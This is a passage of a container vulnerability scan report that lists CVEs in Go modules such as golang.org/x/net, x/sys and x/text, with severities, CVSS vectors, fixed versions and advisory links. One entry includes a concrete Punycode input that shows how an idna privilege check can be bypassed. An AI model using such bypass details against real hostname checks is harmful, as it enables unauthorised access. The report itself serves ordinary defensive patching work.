                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:f10b8383aba8c81c4599ac42ca4fd0bc6c30cbf59565e7429c0c7
                        │      │                   a30e53efc09 
                        │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go
                        │      │                   HTTP/2: Denial of Service via malformed
                        │      │                   SETTINGS_MAX_FRAME_SIZE frame 
                        │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter
                        │      │                    an infinite loop of writing CONTINUATION frames if it
                        │      │                   receives a SETTINGS_MAX_FRAME_SIZE with a value of 0. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ╭ [0]: CWE-835 
                        │      │                  ╰ [1]: CWE-606 
                        │      ├ VendorSeverity   ╭ amazon     : 3 
                        │      │                  ├ azure      : 2 
                        │      │                  ├ bitnami    : 3 
                        │      │                  ├ nvd        : 3 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ photon     : 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ ubuntu     : 2 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                  │         │           N/A:H 
                        │      │                  │         ╰ V3Score : 7.5 
                        │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                  │         │           N/A:H 
                        │      │                  │         ╰ V3Score : 7.5 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                            │           N/A:H 
                        │      │                            ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
                        │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
                        │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
                        │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
                        │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
                        │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
                        │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
                        │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:43692 
                        │      │                  ├ [10]: https://access.redhat.com/security/cve/CVE-2026-33814 
                        │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
                        │      │                  ├ [12]: https://github.com/golang/go/issues/78476 
                        │      │                  ├ [13]: https://go-review.googlesource.com/c/go/+/761581 
                        │      │                  ├ [14]: https://go-review.googlesource.com/c/net/+/761640 
                        │      │                  ├ [15]: https://go.dev/cl/761581 
                        │      │                  ├ [16]: https://go.dev/cl/761640 
                        │      │                  ├ [17]: https://go.dev/issue/78476 
                        │      │                  ├ [18]: https://groups.google.com/g/golang-announce/c/qcCIEXs
                        │      │                  │       o47M 
                        │      │                  ├ [19]: https://linux.oracle.com/cve/CVE-2026-33814.html 
                        │      │                  ├ [20]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
                        │      │                  ├ [21]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
                        │      │                  ├ [22]: https://pkg.go.dev/vuln/GO-2026-4918 
                        │      │                  ├ [23]: https://security.access.redhat.com/data/csaf/v2/vex/2
                        │      │                  │       026/cve-2026-33814.json 
                        │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8430-1 
                        │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8471-1 
                        │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8472-1 
                        │      │                  ├ [27]: https://ubuntu.com/security/notices/USN-8473-1 
                        │      │                  ╰ [28]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
                        │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
                        │      ╰ LastModifiedDate: 2026-07-24T13:18:01.21Z 
                        ├ [3]  ╭ VulnerabilityID : CVE-2026-39821 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5026 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39821 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:9c10c686b9f10ef0fe44ecea8032c4ab4b1587db132b3c49791cb
                        │      │                   e818fb35e7e 
                        │      ├ Title           : golang.org/x/net/idna: golang: net/http:
                        │      │                   golang.org/x/net/idna: Privilege escalation via incorrect
                        │      │                   Punycode label processing 
                        │      ├ Description     : The ToASCII and ToUnicode functions incorrectly accept
                        │      │                   Punycode-encoded labels that decode to an ASCII-only label.
                        │      │                   For example, ToUnicode("xn--example-.com") incorrectly
                        │      │                   returns the name "example.com" rather than an error. This
                        │      │                   behavior can lead to privilege escalation in programs using
                        │      │                   the idna package. For example, a program which performs
                        │      │                   privilege checks on the ASCII hostname may reject
                        │      │                   "example.com" but permit "xn--example-.com". If that program
                        │      │                    subsequently converts the ASCII hostname to Unicode, it
                        │      │                   will inadvertently permits access to the Unicode name
                        │      │                   "example.com". 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-1289 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 3 
                        │      │                  ├ azure      : 4 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ├ rocky      : 3 
                        │      │                  ╰ ubuntu     : 2 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 8.2 
                        │      ├ References       ╭ [0]  : https://access.redhat.com/errata/RHSA-2026:23262 
                        │      │                  ├ [1]  : https://access.redhat.com/errata/RHSA-2026:23264 
                        │      │                  ├ [2]  : https://access.redhat.com/errata/RHSA-2026:26546 
                        │      │                  ├ [3]  : https://access.redhat.com/errata/RHSA-2026:26547 
                        │      │                  ├ [4]  : https://access.redhat.com/errata/RHSA-2026:30650 
                        │      │                  ├ [5]  : https://access.redhat.com/errata/RHSA-2026:30651 
                        │      │                  ├ [6]  : https://access.redhat.com/errata/RHSA-2026:30853 
                        │      │                  ├ [7]  : https://access.redhat.com/errata/RHSA-2026:30854 
                        │      │                  ├ [8]  : https://access.redhat.com/errata/RHSA-2026:30855 
                        │      │                  ├ [9]  : https://access.redhat.com/errata/RHSA-2026:33155 
                        │      │                  ├ [10] : https://access.redhat.com/errata/RHSA-2026:33160 
                        │      │                  ├ [11] : https://access.redhat.com/errata/RHSA-2026:33163 
                        │      │                  ├ [12] : https://access.redhat.com/errata/RHSA-2026:33173 
                        │      │                  ├ [13] : https://access.redhat.com/errata/RHSA-2026:33183 
                        │      │                  ├ [14] : https://access.redhat.com/errata/RHSA-2026:33524 
                        │      │                  ├ [15] : https://access.redhat.com/errata/RHSA-2026:33531 
                        │      │                  ├ [16] : https://access.redhat.com/errata/RHSA-2026:34342 
                        │      │                  ├ [17] : https://access.redhat.com/errata/RHSA-2026:34357 
                        │      │                  ├ [18] : https://access.redhat.com/errata/RHSA-2026:34359 
                        │      │                  ├ [19] : https://access.redhat.com/errata/RHSA-2026:34364 
                        │      │                  ├ [20] : https://access.redhat.com/errata/RHSA-2026:34789 
                        │      │                  ├ [21] : https://access.redhat.com/errata/RHSA-2026:35826 
                        │      │                  ├ [22] : https://access.redhat.com/errata/RHSA-2026:35827 
                        │      │                  ├ [23] : https://access.redhat.com/errata/RHSA-2026:35828 
                        │      │                  ├ [24] : https://access.redhat.com/errata/RHSA-2026:35829 
                        │      │                  ├ [25] : https://access.redhat.com/errata/RHSA-2026:35830 
                        │      │                  ├ [26] : https://access.redhat.com/errata/RHSA-2026:35831 
                        │      │                  ├ [27] : https://access.redhat.com/errata/RHSA-2026:35993 
                        │      │                  ├ [28] : https://access.redhat.com/errata/RHSA-2026:35994 
                        │      │                  ├ [29] : https://access.redhat.com/errata/RHSA-2026:36105 
                        │      │                  ├ [30] : https://access.redhat.com/errata/RHSA-2026:36167 
                        │      │                  ├ [31] : https://access.redhat.com/errata/RHSA-2026:36207 
                        │      │                  ├ [32] : https://access.redhat.com/errata/RHSA-2026:36648 
                        │      │                  ├ [33] : https://access.redhat.com/errata/RHSA-2026:36651 
                        │      │                  ├ [34] : https://access.redhat.com/errata/RHSA-2026:36796 
                        │      │                  ├ [35] : https://access.redhat.com/errata/RHSA-2026:36797 
                        │      │                  ├ [36] : https://access.redhat.com/errata/RHSA-2026:36808 
                        │      │                  ├ [37] : https://access.redhat.com/errata/RHSA-2026:36820 
                        │      │                  ├ [38] : https://access.redhat.com/errata/RHSA-2026:36883 
                        │      │                  ├ [39] : https://access.redhat.com/errata/RHSA-2026:37387 
                        │      │                  ├ [40] : https://access.redhat.com/errata/RHSA-2026:37435 
                        │      │                  ├ [41] : https://access.redhat.com/errata/RHSA-2026:37436 
                        │      │                  ├ [42] : https://access.redhat.com/errata/RHSA-2026:38995 
                        │      │                  ├ [43] : https://access.redhat.com/errata/RHSA-2026:39005 
                        │      │                  ├ [44] : https://access.redhat.com/errata/RHSA-2026:39573 
                        │      │                  ├ [45] : https://access.redhat.com/errata/RHSA-2026:39879 
                        │      │                  ├ [46] : https://access.redhat.com/errata/RHSA-2026:40118 
                        │      │                  ├ [47] : https://access.redhat.com/errata/RHSA-2026:40262 
                        │      │                  ├ [48] : https://access.redhat.com/errata/RHSA-2026:40945 
                        │      │                  ├ [49] : https://access.redhat.com/errata/RHSA-2026:41019 
                        │      │                  ├ [50] : https://access.redhat.com/errata/RHSA-2026:41030 
                        │      │                  ├ [51] : https://access.redhat.com/errata/RHSA-2026:41031 
                        │      │                  ├ [52] : https://access.redhat.com/errata/RHSA-2026:41036 
                        │      │                  ├ [53] : https://access.redhat.com/errata/RHSA-2026:41055 
                        │      │                  ├ [54] : https://access.redhat.com/errata/RHSA-2026:41066 
                        │      │                  ├ [55] : https://access.redhat.com/errata/RHSA-2026:41928 
                        │      │                  ├ [56] : https://access.redhat.com/errata/RHSA-2026:41930 
                        │      │                  ├ [57] : https://access.redhat.com/errata/RHSA-2026:42043 
                        │      │                  ├ [58] : https://access.redhat.com/errata/RHSA-2026:42047 
                        │      │                  ├ [59] : https://access.redhat.com/errata/RHSA-2026:42048 
                        │      │                  ├ [60] : https://access.redhat.com/errata/RHSA-2026:42049 
                        │      │                  ├ [61] : https://access.redhat.com/errata/RHSA-2026:42050 
                        │      │                  ├ [62] : https://access.redhat.com/errata/RHSA-2026:42051 
                        │      │                  ├ [63] : https://access.redhat.com/errata/RHSA-2026:42078 
                        │      │                  ├ [64] : https://access.redhat.com/errata/RHSA-2026:42079 
                        │      │                  ├ [65] : https://access.redhat.com/errata/RHSA-2026:42080 
                        │      │                  ├ [66] : https://access.redhat.com/errata/RHSA-2026:42082 
                        │      │                  ├ [67] : https://access.redhat.com/errata/RHSA-2026:42132 
                        │      │                  ├ [68] : https://access.redhat.com/errata/RHSA-2026:42142 
                        │      │                  ├ [69] : https://access.redhat.com/errata/RHSA-2026:42146 
                        │      │                  ├ [70] : https://access.redhat.com/errata/RHSA-2026:42150 
                        │      │                  ├ [71] : https://access.redhat.com/errata/RHSA-2026:42151 
                        │      │                  ├ [72] : https://access.redhat.com/errata/RHSA-2026:42240 
                        │      │                  ├ [73] : https://access.redhat.com/errata/RHSA-2026:42644 
                        │      │                  ├ [74] : https://access.redhat.com/errata/RHSA-2026:42796 
                        │      │                  ├ [75] : https://access.redhat.com/errata/RHSA-2026:42852 
                        │      │                  ├ [76] : https://access.redhat.com/errata/RHSA-2026:43038 
                        │      │                  ├ [77] : https://access.redhat.com/errata/RHSA-2026:43052 
                        │      │                  ├ [78] : https://access.redhat.com/errata/RHSA-2026:43692 
                        │      │                  ├ [79] : https://access.redhat.com/errata/RHSA-2026:44622 
                        │      │                  ├ [80] : https://access.redhat.com/errata/RHSA-2026:44624 
                        │      │                  ├ [81] : https://access.redhat.com/errata/RHSA-2026:46395 
                        │      │                  ├ [82] : https://access.redhat.com/errata/RHSA-2026:47149 
                        │      │                  ├ [83] : https://access.redhat.com/errata/RHSA-2026:47735 
                        │      │                  ├ [84] : https://access.redhat.com/errata/RHSA-2026:47737 
                        │      │                  ├ [85] : https://access.redhat.com/errata/RHSA-2026:47952 
                        │      │                  ├ [86] : https://access.redhat.com/security/cve/CVE-2026-39821 
                        │      │                  ├ [87] : https://bugzilla.redhat.com/2480756 
                        │      │                  ├ [88] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
                        │      │                  ├ [89] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
                        │      │                  ├ [90] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
                        │      │                  │        026-39821 
                        │      │                  ├ [91] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
                        │      │                  │        026-39822 
                        │      │                  ├ [92] : https://errata.almalinux.org/9/ALSA-2026-37435.html 
                        │      │                  ├ [93] : https://errata.rockylinux.org/RLSA-2026:37435 
                        │      │                  ├ [94] : https://github.com/golang/go/issues/78760 
                        │      │                  ├ [95] : https://go.dev/cl/767220 
                        │      │                  ├ [96] : https://go.dev/issue/78760 
                        │      │                  ├ [97] : https://groups.google.com/g/golang-announce/c/iI-mYS
                        │      │                  │        I0lu8 
                        │      │                  ├ [98] : https://linux.oracle.com/cve/CVE-2026-39821.html 
                        │      │                  ├ [99] : https://linux.oracle.com/errata/ELSA-2026-46395.html 
                        │      │                  ├ [100]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
                        │      │                  ├ [101]: https://pkg.go.dev/vuln/GO-2026-5026 
                        │      │                  ├ [102]: https://security.access.redhat.com/data/csaf/v2/vex/
                        │      │                  │        2026/cve-2026-39821.json 
                        │      │                  ├ [103]: https://ubuntu.com/security/notices/USN-8416-1 
                        │      │                  ╰ [104]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
                        │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
                        │      ╰ LastModifiedDate: 2026-07-31T13:18:09.37Z 
                        ├ [4]  ╭ VulnerabilityID : CVE-2026-25680 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5028 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25680 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:0d54de425b720db96a74620d0f2994d2ced1b7fd44c4e8a1f79dd
                        │      │                   73900b2814e 
                        │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Denial of
                        │      │                   Service due to excessive HTML parsing 
                        │      ├ Description     : Parsing arbitrary HTML can consume excessive CPU time,
                        │      │                   possibly leading to denial of service. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-400 
                        │      ├ VendorSeverity   ╭ amazon: 3 
                        │      │                  ├ azure : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N
                        │      │                           │           /A:H 
                        │      │                           ╰ V3Score : 6.5 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-25680 
                        │      │                  ├ [1]: https://go.dev/cl/781702 
                        │      │                  ├ [2]: https://go.dev/issue/79573 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0
                        │      │                  │      lu8 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-25680 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5028 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-25680 
                        │      ├ PublishedDate   : 2026-05-22T16:16:19.753Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [5]  ╭ VulnerabilityID : CVE-2026-42502 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5027 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42502 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:36139ee961f009a10833994d72b51eecfd9a407a8f03b6eec74b4
                        │      │                   80a6474ce78 
                        │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html:
                        │      │                   Cross-Site Scripting via unexpected HTML tree rendering 
                        │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render
                        │      │                   can result in an unexpected HTML tree. This can be leveraged
                        │      │                    to execute XSS attacks in applications that attempt to
                        │      │                   sanitize input HTML before rendering. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-1021 
                        │      ├ VendorSeverity   ╭ amazon: 3 
                        │      │                  ├ azure : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 6.1 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42502 
                        │      │                  ├ [1]: https://go.dev/cl/781701 
                        │      │                  ├ [2]: https://go.dev/issue/79572 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0
                        │      │                  │      lu8 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42502 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5027 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42502 
                        │      ├ PublishedDate   : 2026-05-22T16:16:20.587Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [6]  ╭ VulnerabilityID : CVE-2026-42506 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5025 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42506 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:8aa94591e998b07a578806961b98eb1419f079f2323da94e88623
                        │      │                   195a90ac8f9 
                        │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Cross-Site
                        │      │                   Scripting (XSS) via arbitrary HTML parsing 
                        │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render
                        │      │                   can result in an unexpected HTML tree. This can be leveraged
                        │      │                    to execute XSS attacks in applications that attempt to
                        │      │                   sanitize input HTML before rendering. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-79 
                        │      ├ VendorSeverity   ╭ amazon: 3 
                        │      │                  ├ azure : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 5.4 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42506 
                        │      │                  ├ [1]: https://go.dev/cl/781700 
                        │      │                  ├ [2]: https://go.dev/issue/79571 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0
                        │      │                  │      lu8 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42506 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5025 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42506 
                        │      ├ PublishedDate   : 2026-05-22T16:16:20.803Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [7]  ╭ VulnerabilityID : CVE-2026-46600 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5942 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.56.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:cf7f55d8431e0cdaeff7b2f90506ee15b3c150d30d3c6b2ff4fe4
                        │      │                   5b7ee61b7a0 
                        │      ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size
                        │      │                   of a param ... 
                        │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
                        │      │                   of a parameter value overflows the message buffer. 
                        │      ├ Severity        : UNKNOWN 
                        │      ├ CweIDs           ─ [0]: CWE-125 
                        │      ├ References       ╭ [0]: https://go.dev/cl/786345 
                        │      │                  ├ [1]: https://go.dev/issue/79795 
                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
                        │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
                        │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
                        ├ [8]  ╭ VulnerabilityID : CVE-2026-39824 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5024 
                        │      ├ PkgID           : golang.org/x/sys@v0.42.0 
                        │      ├ PkgName         : golang.org/x/sys 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/sys@v0.42.0 
                        │      │                  ╰ UID : 9dd104bb9b94dda4 
                        │      ├ InstalledVersion: v0.42.0 
                        │      ├ FixedVersion    : 0.44.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39824 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:134a656702b264e35fc7e89b8d6e7ba06e0002c15546972d69449
                        │      │                   7e096239908 
                        │      ├ Title           : Invoking integer overflow in NewNTUnicodeString in
                        │      │                   golang.org/x/sys/windows 
                        │      ├ Description     : NewNTUnicodeString does not check for string length
                        │      │                   overflow. When provided with a string that overflows the
                        │      │                   maximum size of a NTUnicodeString (a 16-bit number of
                        │      │                   bytes), it returns a truncated string rather than an
                        │      │                   error. 
                        │      ├ Severity        : UNKNOWN 
                        │      ├ CweIDs           ─ [0]: CWE-190 
                        │      ├ References       ╭ [0]: https://go.dev/cl/770080 
                        │      │                  ├ [1]: https://go.dev/issue/78916 
                        │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/6MMI8Lj-
                        │      │                  │      Atg 
                        │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5024 
                        │      ├ PublishedDate   : 2026-05-22T20:16:33.057Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [9]  ╭ VulnerabilityID : CVE-2026-56852 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5970 
                        │      ├ PkgID           : golang.org/x/text@v0.33.0 
                        │      ├ PkgName         : golang.org/x/text 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.33.0 
                        │      │                  ╰ UID : 1d58fdff500f9aea 
                        │      ├ InstalledVersion: v0.33.0 
                        │      ├ FixedVersion    : 0.39.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:d92ea3ec48c647c601b4c6b47bd6f19203a2a02e975df145cf63d
                        │      │                   e3d384cc1c5 
                        │      ├ Title           : A norm.Iter can enter an infinite loop when handling input
                        │      │                   containing  ... 
                        │      ├ Description     : A norm.Iter can enter an infinite loop when handling input
                        │      │                   containing invalid UTF-8 bytes. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-835 
                        │      ├ VendorSeverity   ─ azure: 3 
                        │      ├ References       ╭ [0]: https://go.dev/cl/794100 
                        │      │                  ├ [1]: https://go.dev/issue/80142 
                        │      │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-56852 
                        │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5970 
                        │      ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
                        │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
                        ├ [10] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
                        │      ├ PkgID           : google.golang.org/grpc@v1.79.3 
                        │      ├ PkgName         : google.golang.org/grpc 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.79.3 
                        │      │                  ╰ UID : f8603e27ab63e541 
                        │      ├ InstalledVersion: v1.79.3 
                        │      ├ FixedVersion    : 1.82.1 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
